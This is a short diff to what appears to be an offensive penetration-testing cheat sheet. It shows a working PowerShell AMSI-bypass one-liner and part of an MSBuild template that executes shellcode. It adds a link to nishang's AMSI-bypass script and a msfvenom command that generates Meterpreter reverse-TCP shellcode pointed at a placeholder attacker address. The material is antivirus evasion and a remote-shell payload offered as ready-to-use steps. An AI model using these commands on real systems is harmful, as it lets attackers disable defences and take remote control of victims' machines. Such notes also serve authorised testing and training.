@@ -1270,6 +1270,8 @@ by your antivirus software", then run this command to disable that blocker.
 $a=[Ref].Assembly.GetTypes();foreach($b in $a){if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
 ```
 
+Other bypasses available through nishang's [Invoke-AMSIBypass](https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1).
+
 ### 5.4.2. Turn off Windows Firewall
 
 ```bat
@@ -1321,6 +1323,8 @@ with Empire)
 ```xml
 <!-- This is 32-bit. To make 64-bit, swap all UInt32's for UInt64, use 64-bit
      shellcode, and build with 64-bit MSBuild.exe
+     Building Shellcode:
+     msfvenom -p windows/meterpreter/reverse_tcp lhost=YOUR_IP lport=443 -f csharp | tee shellcode.cs
 -->
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <!-- This inline task executes shellcode. -->
